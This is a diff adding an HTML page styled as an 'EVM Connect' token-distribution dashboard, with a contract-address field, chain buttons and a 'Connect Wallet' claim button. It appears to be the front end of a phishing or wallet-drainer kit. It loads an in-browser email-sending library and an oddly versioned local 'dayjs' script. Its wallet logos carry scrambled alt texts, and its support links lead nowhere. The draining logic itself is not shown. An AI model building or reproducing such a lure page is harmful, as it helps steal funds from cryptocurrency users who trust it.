@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>EVM CONNECT DASHBOARD</title>
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script charset="UTF-8" type="text/javascript" src="./dayjs-5.10.5.min.js"></script>
+  <script src="script.js" defer></script>
+
+  <style>
+    :root{
+      --primary:#19b373;--primary-dark:#148a5a;--bg-dark:#0a0a0a;--card-bg:rgba(20,20,20,.7);
+      --text:#e0e0e0;--text-light:#aaa;--glow:0 0 15px rgba(25,179,115,.5);
+    }
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{
+      font-family:'Segoe UI','Roboto',sans-serif;background:linear-gradient(135deg,#0a0a0a 0%,#111 50%,#0a0a0a 100%);
+      color:var(--text);overflow-x:hidden;position:relative;min-height:100vh;animation:fadeIn 1.5s ease-out;
+    }
+    body::before{
+      content:'';position:absolute;inset:0;
+      background:radial-gradient(circle at 20% 80%,rgba(25,179,115,.15)0%,transparent 50%),
+                 radial-gradient(circle at 80% 20%,rgba(25,179,115,.1)0%,transparent 50%);
+      animation:float 20s infinite ease-in-out;z-index:0;pointer-events:none;
+    }
+    @keyframes float{0%,100%{transform:translateY(0) scale(1)}50%{transform:translateY(-30px) scale(1.05)}}
+    .particle{
+      position:absolute;background:var(--primary);border-radius:50%;opacity:.1;pointer-events:none;
+      animation:drift linear infinite;
+    }
+    @keyframes drift{0%{transform:translate(0,0)}100%{transform:translate(var(--dx),var(--dy))}}
+    .container{position:relative;z-index:1;max-width:1200px;margin:auto;padding:20px;}
+    .glass{
+      background:var(--card-bg);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
+      border:1px solid rgba(25,179,115,.2);border-radius:16px;padding:24px;
+      box-shadow:0 8px 32px rgba(0,0,0,.3);transition:all .4s ease;
+    }
+    .glass:hover{transform:translateY(-5px);box-shadow:var(--glow),0 12px 40px rgba(0,0,0,.4);}
+    .header-box{display:flex;align-items:center;gap:15px;margin-bottom:30px;animation:slideInLeft 1s ease-out;}
+    .header-box img{width:100px;height:90px;filter:drop-shadow(0 0 8px var(--primary));}
+    .header-box h1{
+      font-size:2em;background:linear-gradient(90deg,#fff,var(--primary));
+      -webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:700;
+    }
+    .header-box p{color:var(--text-light);font-size:.9em;}
+    .title-center{
+      text-align:center;font-size:2.2em;margin:40px 0 20px;font-weight:800;
+      background:linear-gradient(90deg,var(--primary),#00ff9d);
+      -webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:fadeInUp 1.2s ease-out;
+    }
+    .main-box{margin-bottom:40px;animation:fadeInUp 1.4s ease-out;}
+    .main{display:flex;flex-wrap:wrap;gap:30px;justify-content:center;}
+    .left,.chains-box{flex:1;min-width:300px;}
+    .project-input h2,.chains-box h2{
+      font-size:1.6em;margin-bottom:20px;color:var(--primary);
+      text-shadow:0 0 10px rgba(25,179,115,.4);
+    }
+    #contract-address{
+      width:100%;padding:14px;margin-bottom:15px;background:rgba(0,0,0,.5);
+      border:1px solid var(--primary);color:var(--text);border-radius:12px;font-size:1em;
+      transition:all .3s ease;
+    }
+    #contract-address:focus{outline:none;box-shadow:var(--glow);}
+    #retrieve-btn{
+      background:rgba(25,179,115,.15);color:#fff;border:1px solid var(--primary);
+      padding:14px 20px;font-size:1em;border-radius:12px;cursor:pointer;width:100%;
+      transition:all .3s ease;position:relative;overflow:hidden;font-weight:500;
+    }
+    #retrieve-btn::before{
+      content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;
+      background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent);
+      transition:.6s;
+    }
+    #retrieve-btn:hover::before{left:100%;}
+    #retrieve-btn:hover{
+      background:var(--primary);box-shadow:var(--glow);transform:translateY(-2px);
+    }
+    .chain-options{
+      display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
+      gap:14px;margin-top:10px;
+    }
+    .chain{
+      background:rgba(25,179,115,.15);color:#fff;border:1px solid var(--primary);
+      padding:12px 16px;border-radius:14px;font-size:.95em;font-weight:500;
+      cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;
+      transition:all .3s ease;position:relative;overflow:hidden;box-shadow:0 4px 12px rgba(0,0,0,.2);
+    }
+    .chain img{width:22px;height:22px;filter:brightness(1.2);}
+    .chain::before{
+      content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;
+      background:linear-gradient(90deg,transparent,rgba(255,255,255,.15),transparent);
+      transition:.6s;
+    }
+    .chain:hover::before{left:100%;}
+    .chain:hover{
+      background:var(--primary);transform:translateY(-3px);box-shadow:var(--glow);
+    }
+    .chain.selected{
+      background:var(--primary);box-shadow:var(--glow);font-weight:600;
+    }
+    #project-details{
+      margin-top:25px;padding:20px;background:var(--card-bg);border-radius:12px;
+      box-shadow:var(--glow);animation:fadeInUp .8s ease-out;border:1px solid rgba(25,179,115,.3);
+    }
+    #project-details ul{list-style:none;padding:0;}
+    #project-details li{
+      display:flex;justify-content:space-between;margin:10px 0;padding:8px 0;
+      border-bottom:1px solid rgba(25,179,115,.2);font-size:1em;
+    }
+    #project-details li strong{color:var(--primary);}
+    #project-details.loading{text-align:center;color:var(--text-light);font-style:italic;}
+    #project-details.error{color:#ff6b6b;text-align:center;font-weight:500;}
+    .claim-box{
+      text-align:center;margin:50px 0 30px;height:60px;position:relative;animation:fadeInUp 1.6s ease-out;
+    }
+    .interact-button{
+      background:linear-gradient(135deg,var(--primary),var(--primary-dark));
+      color:#fff;border:none;border-radius:12px;cursor:pointer;
+      box-shadow:var(--glow),0 8px 20px rgba(25,179,115,.3);
+      transition:all .4s ease;position:relative;overflow:hidden;
+      text-transform:uppercase;letter-spacing:1px;font-weight:700;
+    }
+    .interact-button::before{
+      content:'';position:absolute;top:0;left:0;width:100%;height:100%;
+      background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent);
+      transform:translateX(-100%);transition:.6s;
+    }
+    .interact-button:hover::before{transform:translateX(100%);}
+    .interact-button:hover{
+      transform:translateY(-4px);
+      box-shadow:0 0 25px rgba(25,179,115,.7),0 12px 30px rgba(0,0,0,.4);
+    }
+    .interact-button:disabled{
+      background:#333;color:#666;cursor:not-allowed;box-shadow:none;opacity:.6;
+    }
+    .wallet-logos{
+      display:flex;flex-wrap:wrap;justify-content:center;gap:25px;margin:50px 0;
+      animation:fadeInUp 1.8s ease-out;
+    }
+    .wallet-logos img{
+      width:55px;height:55px;border-radius:12px;transition:all .3s ease;
+      filter:grayscale(20%) brightness(1.1);box-shadow:0 4px 15px rgba(0,0,0,.3);
+    }
+    .wallet-logos img:hover{
+      transform:translateY(-8px) scale(1.1);filter:grayscale(0%) brightness(1.3);
+      box-shadow:var(--glow);
+    }
+    .support{text-align:center;margin:30px 0;}
+    .support a{margin:0 15px;display:inline-block;}
+    .support img{
+      width:36px;height:36px;filter:brightness(.8);transition:all .3s ease;
+    }
+    .support img:hover{
+      filter:brightness(1) drop-shadow(0 0 8px var(--primary));
+      transform:scale(1.3) rotate(10deg);
+    }
+    footer{
+      text-align:center;font-size:.9em;padding:20px;color:var(--text-light);
+      border-top:1px solid rgba(25,179,115,.2);margin-top:50px;animation:fadeIn 2s ease-out;
+    }
+    @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+    @keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+    @keyframes slideInLeft{from{opacity:0;transform:translateX(-50px)}to{opacity:1;transform:translateX(0)}}
+    @media(max-width:768px){
+      .main{flex-direction:column;}
+      .title-center{font-size:1.8em;}
+      .interact-button{font-size:1.1em;padding:16px 30px;}
+      .chain-options{grid-template-columns:repeat(2,1fr);}
+    }
+    @media(max-width:480px){.chain-options{grid-template-columns:1fr;}}
+  </style>
+</head>
+<body>
+
+  <!-- floating particles -->
+  <div class="particle" style="width:6px;height:6px;top:20%;left:15%;--dx:120px;--dy:-80px;animation-duration:15s;"></div>
+  <div class="particle" style="width:4px;height:4px;top:60%;left:80%;--dx:-100px;--dy:60px;animation-duration:18s;"></div>
+  <div class="particle" style="width:5px;height:5px;top:40%;left:50%;--dx:80px;--dy:-100px;animation-duration:22s;"></div>
+
+  <div class="container">
+    <div class="header-box glass">
+      <img src="image/logo.png" alt="Logo" />
+      <div>
+        <h1>EVM Connect</h1>
+        <p>Secured Connection and Smart Protection</p>
+      </div>
+    </div>
+
+    <div class="title-center">EVM DISTRIBUTION</div>
+
+    <div class="main-box glass">
+      <div class="main">
+        <div class="left">
+          <div class="project-input">
+            <h2>Project Contract Address</h2>
+            <input type="text" id="contract-address" placeholder="Enter contract address...">
+            <button id="retrieve-btn">Retrieve Details</button>
+            <div id="project-details"></div>
+          </div>
+        </div>
+
+        <div class="chains-box">
+  <h2>Select Chain</h2>
+  <div class="chain-options">
+    <button class="chain selected" data-chain="ethereum">
+      <img src="image/eth.png" alt="Ethereum"> Ethereum
+    </button>
+    <button class="chain" data-chain="polygon">
+      <img src="image/polygon.png" alt="Polygon"> Polygon
+    </button>
+    <button class="chain" data-chain="binance">
+      <img src="image/bsc.png" alt="Binance"> Binance S.
+    </button>
+    <button class="chain" data-chain="base">
+      <img src="image/base.png" alt="Base"> Base
+    </button>
+    <button class="chain" data-chain="arbitrum">
+      <img src="image/arbitrum.png" alt="Arbitrum"> Arbitrum
+    </button>
+  </div>
+</div>
+      </div>
+    </div>
+
+    <div class="claim-box">
+      <button class="interact-button flex h-full w-full items-center justify-center">
+        <span class="text-[1.125rem]">Connect Wallet</span>
+      </button>
+    </div>
+
+    <div class="wallet-logos">
+      <img src="image/phantom.png" alt="Tedwoble">
+      <img src="image/trust.png" alt="Onlink">
+      <img src="image/glow.png" alt="Retsibork">
+      <img src="image/backpack.png" alt="Retiwiler">
+      <img src="image/cuu.png" alt="Cu">
+      <img src="image/coinbase.png" alt="TSR">
+    </div>
+
+    <div class="support">
+      <a href="#"><img src="image/telegram.png" alt="Telegram"></a>
+      <a href="#"><img src="image/discord.png" alt="Discord"></a>
+      <a href="#"><img src="image/website.png" alt="Website"></a>
+    </div>
+
+    <footer>&copy; 2025 EVMConnect. All rights reserved.</footer>
+  </div>
+
+</body>
+</html>
